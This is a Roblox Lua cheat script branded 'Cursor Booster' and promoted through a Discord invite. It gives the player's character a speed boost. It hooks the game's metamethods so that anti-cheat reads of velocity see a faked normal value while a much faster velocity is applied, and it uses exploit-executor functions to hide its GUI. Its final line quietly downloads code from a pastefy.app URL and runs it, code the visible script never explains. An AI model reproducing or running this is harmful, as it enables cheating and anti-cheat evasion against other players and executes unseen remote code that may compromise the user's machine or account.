local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

local function getGuiParent()
	local parent = nil
	pcall(function()
		if typeof(gethui) == "function" then
			parent = gethui()
		end
	end)
	if parent then return parent end
	pcall(function()
		parent = game:GetService("CoreGui")
	end)
	if parent then return parent end
	return LocalPlayer:WaitForChild("PlayerGui")
end

local targetParent = getGuiParent()
local CONFIG_FILE = "CursorBoosterConfig.json"

local BLACK = Color3.fromRGB(5, 5, 6)
local PANEL = Color3.fromRGB(9, 9, 11)
local ROW = Color3.fromRGB(12, 12, 15)
local BORDER = Color3.fromRGB(45, 45, 50)
local TEXT = Color3.fromRGB(235, 235, 238)
local MUTED = Color3.fromRGB(160, 160, 165)

local spoofedVelocity = Vector3.zero
local speedValue = 59
local boosterActive = true
local isMinimized = false

local function saveConfig()
	local data = {
		Speed = speedValue,
		Active = boosterActive
	}
	pcall(function()
		if writefile then
			writefile(CONFIG_FILE, HttpService:JSONEncode(data))
		end
	end)
end

local function loadConfig()
	pcall(function()
		if isfile and isfile(CONFIG_FILE) then
			local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
			if data then
				if type(data.Speed) == "number" then
					speedValue = data.Speed
				end
				if type(data.Active) == "boolean" then
					boosterActive = data.Active
				end
			end
		end
	end)
end

loadConfig()

local oldIndex
oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
	if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") then
		if typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and LocalPlayer.Character and self:IsDescendantOf(LocalPlayer.Character) then
			return spoofedVelocity
		end
	end
	return oldIndex(self, key)
end))

local oldNewIndex
oldNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(self, key, value)
	if not checkcaller() and (key == "AssemblyLinearVelocity" or key == "Velocity") then
		if typeof(self) == "Instance" and self:IsA("BasePart") and self.Name == "HumanoidRootPart" and LocalPlayer.Character and self:IsDescendantOf(LocalPlayer.Character) then
			spoofedVelocity = value
			return
		end
	end
	return oldNewIndex(self, key, value)
end))

local function getRealVelocity(root)
	return oldIndex(root, "AssemblyLinearVelocity")
end

local function applyVelocitySpeed(speed)
	if not boosterActive then return end
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not char or not hum or not root or hum.Health <= 0 then return end
	local real = getRealVelocity(root)
	local y = real.Y
	local dir = hum.MoveDirection
	if dir.Magnitude > 0.05 then
		pcall(function()
			if root.SetNetworkOwner then
				root:SetNetworkOwner(LocalPlayer)
			end
		end)
		local unit = dir.Unit
		local sx = unit.X * speed
		local sz = unit.Z * speed
		spoofedVelocity = Vector3.new(unit.X * 16, y, unit.Z * 16)
		oldNewIndex(root, "AssemblyLinearVelocity", Vector3.new(sx, y, sz))
	else
		spoofedVelocity = Vector3.new(0, y, 0)
	end
end

RunService.PreSimulation:Connect(function()
	applyVelocitySpeed(speedValue)
end)
RunService.Heartbeat:Connect(function()
	applyVelocitySpeed(speedValue)
end)
pcall(function()
	RunService.PostSimulation:Connect(function()
		applyVelocitySpeed(speedValue)
	end)
end)

pcall(function()
	local old = targetParent:FindFirstChild("CursorBoosterGui")
	if old then old:Destroy() end
end)

local Gui = Instance.new("ScreenGui")
Gui.Name = "CursorBoosterGui"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function()
	if typeof(syn) == "table" and typeof(syn.protect_gui) == "function" then
		syn.protect_gui(Gui)
	end
end)
local parented = pcall(function()
	Gui.Parent = targetParent
end)
if not parented or not Gui.Parent then
	pcall(function()
		Gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
	end)
end

local Window = Instance.new("Frame")
Window.Name = "Window"
Window.Size = UDim2.fromOffset(250, 168)
Window.Position = UDim2.new(0.5, -125, 0.5, -84)
Window.BackgroundColor3 = BLACK
Window.BorderSizePixel = 0
Window.ClipsDescendants = true
Window.Parent = Gui

local WindowCorner = Instance.new("UICorner")
WindowCorner.CornerRadius = UDim.new(0, 14)
WindowCorner.Parent = Window

local WindowStroke = Instance.new("UIStroke")
WindowStroke.Color = BORDER
WindowStroke.Thickness = 1
WindowStroke.Transparency = 0.15
WindowStroke.Parent = Window

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.ZIndex = 3
Header.Size = UDim2.new(1, -18, 0, 36)
Header.Position = UDim2.fromOffset(9, 4)
Header.BackgroundTransparency = 1
Header.Parent = Window

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.ZIndex = 4
Title.Position = UDim2.fromOffset(4, 2)
Title.Size = UDim2.new(1, -40, 0, 16)
Title.BackgroundTransparency = 1
Title.Text = "CURSOR BOOSTER"
Title.TextColor3 = TEXT
Title.TextSize = 11
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local SubTitle = Instance.new("TextLabel")
SubTitle.Name = "SubTitle"
SubTitle.ZIndex = 4
SubTitle.Position = UDim2.fromOffset(4, 18)
SubTitle.Size = UDim2.new(1, -40, 0, 12)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "discord.gg/cursorhub"
SubTitle.TextColor3 = MUTED
SubTitle.TextSize = 8.5
SubTitle.Font = Enum.Font.GothamMedium
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.Parent = Header

local Min = Instance.new("TextButton")
Min.Name = "Min"
Min.ZIndex = 4
Min.AnchorPoint = Vector2.new(1, 0.5)
Min.Size = UDim2.fromOffset(20, 20)
Min.Position = UDim2.new(1, 0, 0.5, 0)
Min.BackgroundColor3 = ROW
Min.BorderSizePixel = 0
Min.Text = "−"
Min.TextColor3 = TEXT
Min.TextSize = 13
Min.Font = Enum.Font.GothamBold
Min.AutoButtonColor = false
Min.Parent = Header

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 6)
MinCorner.Parent = Min

local MinStroke = Instance.new("UIStroke")
MinStroke.Color = BORDER
MinStroke.Thickness = 1
MinStroke.Transparency = 0.15
MinStroke.Parent = Min

local HeaderLine = Instance.new("Frame")
HeaderLine.Name = "HeaderLine"
HeaderLine.ZIndex = 3
HeaderLine.Size = UDim2.new(1, -18, 0, 1)
HeaderLine.Position = UDim2.fromOffset(9, 42)
HeaderLine.BackgroundColor3 = BORDER
HeaderLine.BorderSizePixel = 0
HeaderLine.Parent = Window

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.ZIndex = 3
Content.Size = UDim2.new(1, -18, 1, -48)
Content.Position = UDim2.fromOffset(9, 46)
Content.BackgroundTransparency = 1
Content.Parent = Window

local SpeedCard = Instance.new("Frame")
SpeedCard.Name = "SpeedCard"
SpeedCard.ZIndex = 4
SpeedCard.Size = UDim2.new(1, 0, 0, 34)
SpeedCard.Position = UDim2.fromOffset(0, 6)
SpeedCard.BackgroundColor3 = ROW
SpeedCard.BorderSizePixel = 0
SpeedCard.Parent = Content

local SpeedCardCorner = Instance.new("UICorner")
SpeedCardCorner.CornerRadius = UDim.new(0, 8)
SpeedCardCorner.Parent = SpeedCard

local SpeedCardStroke = Instance.new("UIStroke")
SpeedCardStroke.Color = BORDER
SpeedCardStroke.Thickness = 1
SpeedCardStroke.Transparency = 0.15
SpeedCardStroke.Parent = SpeedCard

local SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Name = "SpeedLabel"
SpeedLabel.ZIndex = 5
SpeedLabel.Position = UDim2.new(0, 10, 0, 0)
SpeedLabel.Size = UDim2.new(0, 50, 1, 0)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "Speed"
SpeedLabel.TextColor3 = TEXT
SpeedLabel.TextSize = 11
SpeedLabel.Font = Enum.Font.GothamBold
SpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
SpeedLabel.Parent = SpeedCard

local SpeedBox = Instance.new("TextBox")
SpeedBox.Name = "SpeedBox"
SpeedBox.ZIndex = 6
SpeedBox.AnchorPoint = Vector2.new(1, 0.5)
SpeedBox.Position = UDim2.new(1, -10, 0.5, 0)
SpeedBox.Size = UDim2.new(0, 72, 0, 20)
SpeedBox.BackgroundColor3 = PANEL
SpeedBox.BorderSizePixel = 0
SpeedBox.Text = tostring(speedValue)
SpeedBox.PlaceholderText = "59"
SpeedBox.TextColor3 = TEXT
SpeedBox.PlaceholderColor3 = MUTED
SpeedBox.TextSize = 11
SpeedBox.Font = Enum.Font.GothamBold
SpeedBox.ClearTextOnFocus = false
SpeedBox.TextXAlignment = Enum.TextXAlignment.Center
SpeedBox.Parent = SpeedCard

local SpeedBoxCorner = Instance.new("UICorner")
SpeedBoxCorner.CornerRadius = UDim.new(0, 5)
SpeedBoxCorner.Parent = SpeedBox

local SpeedBoxStroke = Instance.new("UIStroke")
SpeedBoxStroke.Color = BORDER
SpeedBoxStroke.Thickness = 1
SpeedBoxStroke.Transparency = 0.15
SpeedBoxStroke.Parent = SpeedBox

local ToggleCard = Instance.new("Frame")
ToggleCard.Name = "ToggleCard"
ToggleCard.ZIndex = 4
ToggleCard.Position = UDim2.new(0, 0, 0, 46)
ToggleCard.Size = UDim2.new(1, 0, 0, 34)
ToggleCard.BackgroundColor3 = ROW
ToggleCard.BorderSizePixel = 0
ToggleCard.Parent = Content

local ToggleCardCorner = Instance.new("UICorner")
ToggleCardCorner.CornerRadius = UDim.new(0, 8)
ToggleCardCorner.Parent = ToggleCard

local ToggleCardStroke = Instance.new("UIStroke")
ToggleCardStroke.Color = BORDER
ToggleCardStroke.Thickness = 1
ToggleCardStroke.Transparency = 0.15
ToggleCardStroke.Parent = ToggleCard

local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.Name = "ToggleLabel"
ToggleLabel.ZIndex = 5
ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
ToggleLabel.Size = UDim2.new(0, 80, 1, 0)
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Text = "Booster"
ToggleLabel.TextColor3 = TEXT
ToggleLabel.TextSize = 11
ToggleLabel.Font = Enum.Font.GothamBold
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.Parent = ToggleCard

local TogglePill = Instance.new("Frame")
TogglePill.Name = "TogglePill"
TogglePill.ZIndex = 5
TogglePill.AnchorPoint = Vector2.new(1, 0.5)
TogglePill.Position = UDim2.new(1, -10, 0.5, 0)
TogglePill.Size = UDim2.new(0, 34, 0, 18)
TogglePill.BackgroundColor3 = Color3.fromRGB(38, 38, 43)
TogglePill.BorderSizePixel = 0
TogglePill.Parent = ToggleCard

local TogglePillCorner = Instance.new("UICorner")
TogglePillCorner.CornerRadius = UDim.new(1, 0)
TogglePillCorner.Parent = TogglePill

local ToggleKnob = Instance.new("Frame")
ToggleKnob.Name = "ToggleKnob"
ToggleKnob.ZIndex = 6
ToggleKnob.AnchorPoint = Vector2.new(0, 0.5)
ToggleKnob.Position = UDim2.new(0, 2, 0.5, 0)
ToggleKnob.Size = UDim2.new(0, 14, 0, 14)
ToggleKnob.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
ToggleKnob.BorderSizePixel = 0
ToggleKnob.Parent = TogglePill

local ToggleKnobCorner = Instance.new("UICorner")
ToggleKnobCorner.CornerRadius = UDim.new(1, 0)
ToggleKnobCorner.Parent = ToggleKnob

local ToggleClick = Instance.new("TextButton")
ToggleClick.Name = "ToggleClick"
ToggleClick.ZIndex = 7
ToggleClick.Size = UDim2.new(1, 0, 1, 0)
ToggleClick.BackgroundTransparency = 1
ToggleClick.Text = ""
ToggleClick.Parent = ToggleCard

local Footer = Instance.new("TextLabel")
Footer.Name = "Footer"
Footer.ZIndex = 4
Footer.Position = UDim2.new(0, 0, 1, -16)
Footer.Size = UDim2.new(1, 0, 0, 14)
Footer.BackgroundTransparency = 1
Footer.Text = "discord.gg/cursorhub"
Footer.TextColor3 = MUTED
Footer.Font = Enum.Font.GothamMedium
Footer.TextSize = 10
Footer.TextXAlignment = Enum.TextXAlignment.Center
Footer.Parent = Content

local tweenInfoFast = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local function updateToggleVisuals()
	if boosterActive then
		TweenService:Create(TogglePill, tweenInfoFast, {BackgroundColor3 = Color3.fromRGB(245, 245, 245)}):Play()
		TweenService:Create(ToggleKnob, tweenInfoFast, {BackgroundColor3 = Color3.fromRGB(5, 5, 5), Position = UDim2.new(1, -16, 0.5, 0)}):Play()
	else
		TweenService:Create(TogglePill, tweenInfoFast, {BackgroundColor3 = Color3.fromRGB(38, 38, 43)}):Play()
		TweenService:Create(ToggleKnob, tweenInfoFast, {BackgroundColor3 = Color3.fromRGB(235, 235, 235), Position = UDim2.new(0, 2, 0.5, 0)}):Play()
	end
end

local function applySpeedFromBox()
	local raw = SpeedBox.Text:gsub(",", "."):gsub("%s+", "")
	local n = tonumber(raw)
	if n then
		speedValue = n
		SpeedBox.Text = tostring(speedValue)
		saveConfig()
	else
		SpeedBox.Text = tostring(speedValue)
	end
end

SpeedBox.FocusLost:Connect(function()
	applySpeedFromBox()
end)

SpeedBox:GetPropertyChangedSignal("Text"):Connect(function()
	local raw = SpeedBox.Text:gsub(",", "."):gsub("%s+", "")
	local n = tonumber(raw)
	if n then
		speedValue = n
	end
end)

ToggleClick.MouseButton1Click:Connect(function()
	boosterActive = not boosterActive
	updateToggleVisuals()
	saveConfig()
end)

Min.MouseButton1Click:Connect(function()
	isMinimized = not isMinimized
	local targetSize = isMinimized and UDim2.fromOffset(250, 44) or UDim2.fromOffset(250, 168)
	TweenService:Create(Window, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		Size = targetSize
	}):Play()
	Min.Text = isMinimized and "+" or "−"
	if isMinimized then
		task.delay(0.1, function()
			if isMinimized then
				Content.Visible = false
				HeaderLine.Visible = false
			end
		end)
	else
		Content.Visible = true
		HeaderLine.Visible = true
	end
end)

local isDragging = false
local dragStartPos = nil
local frameStartPos = nil

Window.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = true
		dragStartPos = input.Position
		frameStartPos = Window.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStartPos
		Window.Position = UDim2.new(
			frameStartPos.X.Scale,
			frameStartPos.X.Offset + delta.X,
			frameStartPos.Y.Scale,
			frameStartPos.Y.Offset + delta.Y
		)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = false
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.RightControl or input.KeyCode == Enum.KeyCode.Insert then
		Gui.Enabled = not Gui.Enabled
	end
end)

updateToggleVisuals()

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()